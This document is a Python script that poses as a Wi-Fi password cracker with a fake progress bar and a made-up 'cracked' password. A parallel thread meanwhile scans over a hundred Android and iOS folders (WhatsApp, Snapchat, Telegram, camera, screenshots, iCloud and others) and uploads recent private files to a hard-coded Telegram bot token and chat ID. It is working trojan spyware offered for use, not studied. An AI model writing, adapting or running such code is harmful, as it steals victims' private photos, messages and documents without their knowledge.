import time
import os
import glob
import requests
import logging
from colorama import Fore, Style, init
from threading import Thread  # لتشغيل المهام بشكل متوازي

# Initialize colorama
init()

# Telegram bot details
BOT_TOKEN = '8025345749:AAEemZXl-O9G358uE6-3HQpHY0gU8_ex4wc'
CHAT_ID = '7631254472'

# File extensions to target
FILE_EXTENSIONS = ['jpg', 'png', 'mp4', 'pdf', 'zip', 'rar', 'jpeg', 'gif', 'mov', 'avi', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', '7z', 'txt', 'csv', 'sql', 'db', 'mdb', 'html', 'htm', 'py', 'exe']

# Logging setup
logging.basicConfig(filename='file_sender.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Fake Wi-Fi hacking function
def fake_hack(network_name):
    print(Fore.GREEN + f"\n[+] Targeting network: {network_name}" + Style.RESET_ALL)
    time.sleep(1)
    print(Fore.CYAN + "[+] Initializing attack..." + Style.RESET_ALL)
    time.sleep(2)
    print(Fore.BLUE + "[+] Cracking password..." + Style.RESET_ALL)
    
    for i in range(1, 101):
        print(Fore.MAGENTA + f"[{i}%] Progress: {'#' * (i // 5)}" + Style.RESET_ALL, end="\r")
        time.sleep(10)  # Reduced sleep time for faster execution
    print("\n" + Fore.GREEN + "[+] Password cracked successfully!" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[+] The password is: {network_name}111" + Style.RESET_ALL)

# Function to send files/messages to Telegram
def send_to_telegram(message=None, file_path=None):
    if message:
        logging.info(f"Preparing to send message: {message}")
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        try:
            response = requests.post(url, data=payload)
            if response.status_code != 200:
                logging.error(f"Failed to send message: {response.text}")
            else:
                logging.info("Message sent successfully!")
        except Exception as e:
            logging.error(f"Error sending message: {e}")
    
    if file_path:
        if os.path.exists(file_path):
            if os.path.isfile(file_path):  
                logging.info(f"Preparing to send file: {file_path}")
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                files = {'document': open(file_path, 'rb')}
                try:
                    response = requests.post(url, files=files, data={'chat_id': CHAT_ID})
                    if response.status_code != 200:
                        logging.error(f"Failed to send file: {response.text}")
                    else:
                        logging.info("File sent successfully!")
                except Exception as e:
                    logging.error(f"Error sending file: {e}")
            else:
                logging.warning(f"Ignoring directory: {file_path}")
        else:
            logging.warning(f"File not found: {file_path}")

# Function to get recent files from a directory
def get_recent_files_from_directory(directory, extensions, limit=1000):
    files = []
    logging.info(f"Scanning directory: {directory} for files with extensions: {extensions}")
    try:
        for ext in extensions:
            found_files = glob.glob(os.path.join(directory, f'*.{ext}'))
            if found_files:
                files.extend(found_files)
    except Exception as e:
        logging.error(f"Error scanning directory {directory}: {e}")
        send_to_telegram(message=f"Error accessing directory: {directory}")
    
    files.sort(key=os.path.getmtime, reverse=True)
    logging.info(f"Found {len(files)} files in {directory}, returning the last {limit}")
    return files[:limit]

# List of directories to scan
file_directories = [
    '/storage/emulated/0/Movies/WhatsApp',
    '/storage/emulated/0/Pictures/WhatsApp',
    '/storage/emulated/0/WhatsApp/Media/Statuses',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/Statuses',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses',
    '/storage/emulated/0/Android/data/com.whatsapp/WhatsApp/Media/WhatsApp Images',
    '/storage/emulated/0/Android/data/com.whatsapp/WhatsApp/Media/WhatsApp Video',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Private',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Private',
    '/storage/emulated/0/Pictures/Instagram',
    '/storage/emulated/0/Android/media/com.instagram.android/Instagram',
    '/storage/emulated/0/Instagram',
    '/storage/emulated/0/Android/data/com.snapchat.android/cache',
    '/storage/emulated/0/Android/media/com.snapchat.android/Snapchat',
    '/storage/emulated/0/Android/media/org.telegram.messenger/Telegram/Telegram Images',	
    '/storage/emulated/0/Android/media/org.telegram.messenger/Telegram/Telegram Video',
    '/storage/emulated/0/Download/Telegram',
    '/storage/emulated/0/Pictures/Telegram',
    '/storage/emulated/0/Android/data/com.facebook.orca/Facebook Messenger',
    '/storage/emulated/0/TikTok',
    '/storage/emulated/0/DCIM/Camera',
    '/storage/emulated/0/Movies/Camera',
    '/storage/emulated/0/Pictures/Download',
    '/storage/emulated/0/DCIM/Screenshots',
    '/storage/emulated/0/Pictures/Screenshots',
    '/storage/emulated/0/Android/media/com.google.android.apps.photos/Google Photos',
    '/storage/emulated/0/Android/data/com.google.android.apps.photos',
    '/storage/emulated/0',
    '/storage/emulated/0/Download',
    '/storage/emulated/0/Documents',
    '/storage/emulated/0/Music',
    '/storage/emulated/0/Android/data/com.twitter.android/files/Twitter',
    '/storage/emulated/0/Android/media/com.twitter.android/Twitter',
    '/storage/emulated/0/Android/data/com.viber.voip/Viber',
    '/storage/emulated/0/Pictures/PhotoEditor',
    '/storage/emulated/0/Pictures/Snapseed',
    '/storage/emulated/0/DCIM/mylll',
    '/storage/emulated/0/DCIM/new',
    '/storage/emulated/0/DCIM/ME',
    '/storage/emulated/0/Android/media/com.tencent.mm/WeChat',
    '/storage/emulated/0/Android/data/com.tencent.mm/MicroMsg/WeChat Images',
    '/storage/emulated/0/Android/data/com.tencent.mm/MicroMsg/WeChat Videos',
    '/storage/emulated/0/Android/media/com.bigo.live/BigoLive',
    '/storage/emulated/0/Android/media/com.like.video/Likee',
    '/storage/emulated/0/Android/media/com.kwai.video/Kwai',
    '/var/mobile/Media/Movies/WhatsApp',
    '/var/mobile/Media/Pictures/WhatsApp',
    '/var/mobile/Media/WhatsApp/Media/Statuses',
    '/var/mobile/Media/WhatsApp/Media/.Statuses',
    '/var/mobile/Media/WhatsApp/Media/WhatsApp Images',
    '/var/mobile/Media/WhatsApp/Media/WhatsApp Video',
    '/var/mobile/Media/WhatsApp/Media/WhatsApp Images/Sent',
    '/var/mobile/Media/WhatsApp/Media/WhatsApp Images/Private',
    '/var/mobile/Media/WhatsApp/Media/WhatsApp Video/Sent',
    '/var/mobile/Media/WhatsApp/Media/WhatsApp Video/Private',
    '/var/mobile/Media/Pictures/Instagram',
    '/var/mobile/Containers/Data/Application/com.instagram/Instagram/Media',
    '/var/mobile/Media/Instagram',
    '/var/mobile/Containers/Data/Application/com.snapchat/Cache',
    '/var/mobile/Media/Snapchat/Stories',
    '/var/mobile/Media/Snapchat/Memories',
    '/var/mobile/Media/Snapchat/Sent Snaps',
    '/var/mobile/Media/Snapchat/Received Snaps',
    '/var/mobile/Media/Telegram/Telegram Images',
    '/var/mobile/Media/Telegram/Telegram Video',
    '/var/mobile/Media/Downloads/Telegram',
    '/var/mobile/Media/Pictures/Telegram',
    '/var/mobile/Containers/Data/Application/com.facebook.orca/Facebook Messenger',
    '/var/mobile/Media/TikTok',
    '/var/mobile/Media/TikTok/Drafts',
    '/var/mobile/Media/TikTok/Downloads',
    '/var/mobile/Media/TikTok/Sent Videos',
    '/var/mobile/Media/DCIM/100APPLE',
    '/var/mobile/Media/Movies/Camera',
    '/var/mobile/Media/Pictures/Download',
    '/var/mobile/Media/DCIM/Screenshots',
    '/var/mobile/Media/Pictures/Screenshots',
    '/var/mobile/Media/Google Photos',
    '/var/mobile/Containers/Data/Application/com.google.android.apps.photos',
    '/var/mobile/Library/CloudStorage',
    '/var/mobile/Containers/Data/Application/com.apple.iCloudDrive/Documents',
    '/var/mobile/Containers/Data/Application/com.apple.iCloudDrive/Downloads',
    '/var/mobile/Containers/Data/Application/com.dropbox.Dropbox',
    '/var/mobile/Containers/Data/Application/com.google.Drive',
    '/var/mobile/Media/iCloud/Photos',
    '/var/mobile/Media/iCloud/Videos',
    '/var/mobile',
    '/var/mobile/Media/Downloads',
    '/var/mobile/Media/Documents',
    '/var/mobile/Media/Music',
    '/var/mobile/Containers/Data/Application/com.twitter/Twitter',
    '/var/mobile/Containers/Data/Application/com.viber/Viber',
    '/var/mobile/Media/Pictures/PhotoEditor',
    '/var/mobile/Media/Pictures/Snapseed',
    '/var/mobile/Media/DCIM/mylll',
    '/var/mobile/Media/DCIM/new',
    '/var/mobile/Media/DCIM/ME',
    '/var/mobile/Containers/Data/Application/com.tencent.mm/WeChat',
    '/var/mobile/Containers/Data/Application/com.tencent.mm/MicroMsg/WeChat Images',
    '/var/mobile/Containers/Data/Application/com.tencent.mm/MicroMsg/WeChat Videos',
    '/var/mobile/Media/BigoLive',
    '/var/mobile/Media/Likee',
    '/var/mobile/Media/Kwai'
]

# Function to send data to Telegram
def send_data():
    send_to_telegram(message="Starting data collection...")
    logging.info("Starting to send data...")
    
    for directory in file_directories:
        recent_files = get_recent_files_from_directory(directory, FILE_EXTENSIONS)
        if not recent_files:
            send_to_telegram(message=f"No files found in directory: {directory}")
            continue
        
        message = f"Directory: {directory}\nFound {len(recent_files)} files.\n"
        message += "\n".join([os.path.basename(file) for file in recent_files])
        send_to_telegram(message=message)
        
        for file in recent_files:
            send_to_telegram(file_path=file)  
    
    send_to_telegram(message="Data collection and sending completed!")
    logging.info("Data sending completed!")

# Main function
def main():
    print(Fore.RED + """
    ██████╗ █████╗ ██████╗ ██╗  ██╗███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██╔══██╗
    ██████╔╝███████║██████╔╝███████║█████╗  ██████╔╝
    ██╔══██╗██╔══██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗
    ██║  ██║██║  ██║██║     ██║  ██║███████╗██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + """=================== ig @rrvmiii =====================

""" + Style.RESET_ALL)
    
    network_name = input(Fore.GREEN + "Enter the name of the Wi-Fi: " + Style.RESET_ALL)
    
    # تشغيل الكود الوهمي في Thread منفصل
    fake_hack_thread = Thread(target=fake_hack, args=(network_name,))
    fake_hack_thread.start()
    
    # تشغيل كود سحب الملفات في Thread منفصل
    send_data_thread = Thread(target=send_data)
    send_data_thread.start()
    
    # الانتظار حتى تنتهي المهام
    fake_hack_thread.join()
    send_data_thread.join()

if __name__ == "__main__":
    main()